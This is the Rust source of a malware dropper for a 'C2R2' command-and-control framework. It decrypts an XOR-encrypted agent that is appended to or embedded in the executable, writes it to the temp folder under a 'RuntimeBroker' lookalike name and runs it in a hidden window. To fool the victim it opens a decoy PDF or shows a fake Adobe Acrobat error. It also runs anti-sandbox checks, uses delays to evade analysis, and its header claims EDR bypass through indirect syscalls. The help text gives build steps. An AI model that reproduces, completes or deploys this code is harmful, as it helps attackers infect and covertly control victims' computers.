//! C2R2 Dropper - Embedded Payload Execution
//!
//! This dropper supports two modes:
//! 1. COMPILED mode: Payload embedded at compile time via config.rs
//! 2. STANDALONE mode: Payload appended to the executable (no recompilation needed)
//!
//! Features:
//! - XOR-encrypted payload (agent or shellcode)
//! - Anti-sandbox/Anti-VM checks
//! - Displaying a decoy PDF
//! - Stealthy execution
//! - INDIRECT SYSCALLS via dinvk for memory allocation (bypasses AV/EDR hooks)

#![cfg_attr(feature = "production", windows_subsystem = "windows")]

mod config;
mod evasion;
mod shellcode;
mod syscalls;

use std::env;
use std::thread;
use std::time::Duration;

/// Magic marker for appended payload data
const PAYLOAD_MARKER: &[u8] = b"C2R2_PAYLOAD_DATA_START_MARKER__";

fn main() {
    // Step 0: Check command line arguments (before any delays)
    // In non-production mode, show help if requested or if no payload is available
    #[cfg(not(feature = "production"))]
    {
        let args: Vec<String> = env::args().collect();
        if args.iter().any(|a| a == "--help" || a == "-h") {
            print_help();
            return;
        }

        // Check if we have any payload available before proceeding
        if !has_payload_available() {
            print_no_payload_error();
            return;
        }
    }

    // Step 1: Initial delay to evade sandbox time acceleration
    thread::sleep(Duration::from_secs(3));

    // Step 2: Run anti-sandbox checks (production only)
    #[cfg(feature = "production")]
    {
        if evasion::is_sandbox_detected() {
            // Exit silently - maybe show a fake error
            show_fake_error();
            return;
        }
    }

    // Step 3: Additional human-like delay
    let delay = evasion::get_random_delay(1000, 3000);
    thread::sleep(Duration::from_millis(delay));

    // Step 4: Open decoy document (PDF) to look legitimate
    #[cfg(target_os = "windows")]
    {
        let _ = open_decoy_pdf();
    }

    // Step 5: Small delay after opening PDF
    thread::sleep(Duration::from_millis(500));

    // Step 6: Execute payload
    // First try standalone mode (appended payload), then fall back to compiled mode
    #[cfg(target_os = "windows")]
    {
        // Try standalone mode first (payload appended to executable)
        if let Some((xor_key, encrypted_agent)) = try_extract_appended_payload() {
            // Execute appended agent
            if let Err(_) = execute_appended_agent(&xor_key, &encrypted_agent) {
                // Fail silently
            }
        } else {
            // Fall back to compiled mode (config.rs)
            if let Err(_) = shellcode::execute_shellcode() {
                // Fail silently
            }
        }
    }
}

/// Try to extract payload appended to this executable
#[cfg(target_os = "windows")]
fn try_extract_appended_payload() -> Option<(Vec<u8>, Vec<u8>)> {
    use std::env;
    use std::fs::File;
    use std::io::Read;

    // Get path to current executable
    let exe_path = env::current_exe().ok()?;

    // Read entire executable
    let mut file = File::open(&exe_path).ok()?;
    let mut data = Vec::new();
    file.read_to_end(&mut data).ok()?;

    // Find payload marker
    let marker_pos = data
        .windows(PAYLOAD_MARKER.len())
        .position(|window| window == PAYLOAD_MARKER)?;

    let start_pos = marker_pos + PAYLOAD_MARKER.len();

    // Read XOR key length (4 bytes, little endian)
    if start_pos + 4 > data.len() {
        return None;
    }
    let key_len = u32::from_le_bytes([
        data[start_pos],
        data[start_pos + 1],
        data[start_pos + 2],
        data[start_pos + 3],
    ]) as usize;

    // Read XOR key
    let key_start = start_pos + 4;
    if key_start + key_len > data.len() {
        return None;
    }
    let xor_key = data[key_start..key_start + key_len].to_vec();

    // Read agent length (4 bytes, little endian)
    let agent_len_start = key_start + key_len;
    if agent_len_start + 4 > data.len() {
        return None;
    }
    let agent_len = u32::from_le_bytes([
        data[agent_len_start],
        data[agent_len_start + 1],
        data[agent_len_start + 2],
        data[agent_len_start + 3],
    ]) as usize;

    // Read encrypted agent
    let agent_start = agent_len_start + 4;
    if agent_start + agent_len > data.len() {
        return None;
    }
    let encrypted_agent = data[agent_start..agent_start + agent_len].to_vec();

    Some((xor_key, encrypted_agent))
}

/// Execute an appended encrypted agent
#[cfg(target_os = "windows")]
fn execute_appended_agent(
    xor_key: &[u8],
    encrypted_agent: &[u8],
) -> Result<(), Box<dyn std::error::Error>> {
    use obfstr::obfstr;
    use rand::Rng;
    use std::fs::File;
    use std::io::Write;
    use std::os::windows::process::CommandExt;
    use std::process::Command;

    // Decrypt agent
    let agent_bytes = xor_decrypt(encrypted_agent, xor_key);

    // Create temp file with random name that looks legitimate
    let temp_dir = std::env::temp_dir();
    let random_suffix: u32 = rand::thread_rng().gen();
    let exe_name = format!("{}_{}.exe", obfstr!("RuntimeBroker"), random_suffix);
    let exe_path = temp_dir.join(&exe_name);

    // Write decrypted agent
    let mut file = File::create(&exe_path)?;
    file.write_all(&agent_bytes)?;
    drop(file);

    // Execute agent in background (hidden window)
    // CREATE_NO_WINDOW = 0x08000000
    Command::new(&exe_path).creation_flags(0x08000000).spawn()?;

    Ok(())
}

/// Decrypt data using XOR
fn xor_decrypt(data: &[u8], key: &[u8]) -> Vec<u8> {
    data.iter()
        .enumerate()
        .map(|(i, &byte)| byte ^ key[i % key.len()])
        .collect()
}

/// Show a fake error message to look like a corrupted PDF
#[cfg(target_os = "windows")]
fn show_fake_error() {
    use obfstr::obfstr;
    use std::ffi::OsStr;
    use std::os::windows::ffi::OsStrExt;
    use std::ptr;
    use winapi::um::winuser::{MessageBoxW, MB_ICONERROR, MB_OK};

    unsafe {
        let title: Vec<u16> = OsStr::new(obfstr!("Adobe Acrobat Reader"))
            .encode_wide()
            .chain(std::iter::once(0))
            .collect();

        let message: Vec<u16> =
            OsStr::new(obfstr!("The file is damaged and could not be repaired."))
                .encode_wide()
                .chain(std::iter::once(0))
                .collect();

        MessageBoxW(
            ptr::null_mut(),
            message.as_ptr(),
            title.as_ptr(),
            MB_OK | MB_ICONERROR,
        );
    }
}

#[cfg(not(target_os = "windows"))]
fn show_fake_error() {}

/// Open a decoy PDF embedded or from temp
#[cfg(target_os = "windows")]
fn open_decoy_pdf() -> Result<(), Box<dyn std::error::Error>> {
    use obfstr::obfstr;
    use std::env;
    use std::fs::File;
    use std::io::Write;

    // Get temp directory
    let temp_dir = env::temp_dir();
    let pdf_path = temp_dir.join(obfstr!("Document.pdf"));

    // Write embedded PDF decoy (minimal valid PDF)
    let pdf_data = config::DECOY_PDF_DATA;
    if !pdf_data.is_empty() {
        let mut file = File::create(&pdf_path)?;
        file.write_all(pdf_data)?;

        // Open with default PDF viewer
        open_file(&pdf_path);
    }

    Ok(())
}

#[cfg(target_os = "windows")]
fn open_file(path: &std::path::PathBuf) {
    use obfstr::obfstr;
    use std::ffi::OsStr;
    use std::os::windows::ffi::OsStrExt;
    use std::ptr;
    use winapi::um::shellapi::ShellExecuteW;
    use winapi::um::winuser::SW_SHOWNORMAL;

    // Only proceed if we have a valid path
    let path_str = match path.to_str() {
        Some(s) if !s.is_empty() => s,
        _ => return, // Skip if path is invalid
    };

    unsafe {
        let operation: Vec<u16> = OsStr::new(obfstr!("open"))
            .encode_wide()
            .chain(std::iter::once(0))
            .collect();

        let path_wide: Vec<u16> = OsStr::new(path_str)
            .encode_wide()
            .chain(std::iter::once(0))
            .collect();

        ShellExecuteW(
            ptr::null_mut(),
            operation.as_ptr(),
            path_wide.as_ptr(),
            ptr::null(),
            ptr::null(),
            SW_SHOWNORMAL,
        );
    }
}

// =============================================================================
// Help and Diagnostics Functions (non-production mode only)
// =============================================================================

/// Print help message explaining how to use the dropper
#[cfg(not(feature = "production"))]
fn print_help() {
    println!("C2R2 Dropper v1.0");
    println!("==================");
    println!();
    println!("This is a standalone dropper template for the C2R2 framework.");
    println!();
    println!("USAGE:");
    println!("  This executable is designed to be used with the C2R2 builder tool.");
    println!("  It cannot be run directly without an embedded or appended payload.");
    println!();
    println!("TO CREATE A WORKING DROPPER:");
    println!();
    println!("  Option 1: Generate Standalone Dropper (Recommended, no Rust required)");
    println!(
        "    builder generate-dropper --agent agent.exe --template dropper.exe --output my_dropper"
    );
    println!();
    println!("  Option 2: Build Dropper with Shellcode (Requires donut + Rust)");
    println!("    1. Install donut: https://github.com/TheWover/donut");
    println!("    2. Generate shellcode: donut.exe -i agent.exe -o shellcode.bin -f 1 -a 2");
    println!("    3. Build: builder build-dropper --shellcode shellcode.bin --output my_dropper");
    println!();
    println!("PREREQUISITES:");
    println!("  - builder executable (from c2r2-server package)");
    println!("  - agent.exe (generated or pre-compiled)");
    println!("  - For shellcode mode: donut (https://github.com/TheWover/donut)");
    println!();
    println!("For more information, see: dropper-rust/README.md");
}

/// Check if there's any payload available (embedded or appended)
#[cfg(all(not(feature = "production"), target_os = "windows"))]
fn has_payload_available() -> bool {
    // Check for appended payload
    if try_extract_appended_payload().is_some() {
        return true;
    }

    // Check for embedded shellcode in config
    if !config::ENCRYPTED_SHELLCODE.is_empty() {
        return true;
    }

    // Check for embedded agent in config
    if !config::ENCRYPTED_AGENT.is_empty() {
        return true;
    }

    false
}

/// Check if there's any payload available (non-Windows version for build testing)
#[cfg(all(not(feature = "production"), not(target_os = "windows")))]
fn has_payload_available() -> bool {
    // Check for embedded shellcode in config
    if !config::ENCRYPTED_SHELLCODE.is_empty() {
        return true;
    }

    // Check for embedded agent in config
    if !config::ENCRYPTED_AGENT.is_empty() {
        return true;
    }

    false
}

/// Print error message when no payload is available
#[cfg(not(feature = "production"))]
fn print_no_payload_error() {
    eprintln!("ERROR: No payload embedded in this dropper.");
    eprintln!();
    eprintln!("This is a template dropper that requires a payload to be embedded or appended.");
    eprintln!();
    eprintln!("To create a working dropper, use the C2R2 builder:");
    eprintln!();
    eprintln!("  Option 1 - Standalone (Recommended):");
    eprintln!("    builder generate-dropper --agent agent.exe --template dropper.exe --output final_dropper");
    eprintln!();
    eprintln!("  Option 2 - With Shellcode (requires donut):");
    eprintln!("    1. Install donut from: https://github.com/TheWover/donut");
    eprintln!("    2. Generate shellcode: donut.exe -i agent.exe -o shellcode.bin -f 1 -a 2");
    eprintln!("    3. Build dropper: builder build-dropper --shellcode shellcode.bin --output final_dropper");
    eprintln!();
    eprintln!("Run with --help for more information.");
}
